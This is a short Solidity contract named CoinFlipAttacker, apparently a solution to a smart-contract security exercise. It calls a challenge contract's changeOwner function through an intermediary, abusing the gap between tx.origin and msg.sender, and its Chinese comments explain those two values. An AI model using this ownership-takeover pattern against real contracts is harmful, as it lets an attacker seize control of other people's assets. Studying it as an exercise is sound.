/**
 *Submitted for verification at Etherscan.io on 2022-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

interface ICoinFlipChallenge {
    function changeOwner(address newOwner) external payable returns (bool);
}

contract CoinFlipAttacker {

    ICoinFlipChallenge public challenge;
    address public msgSender;
    address public txOrigin;
    address public txFrom;

    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    // tx.origin 指向当前交易的 tx.from
    function changeCoinFlipOwner() external payable {
        msgSender = msg.sender; // msg.sender 指向对当前交易签名的地址
        txOrigin = tx.origin; // tx.origin 指向当前交易的 tx.from
        challenge.changeOwner(tx.origin);
    }

    receive() external payable {}

}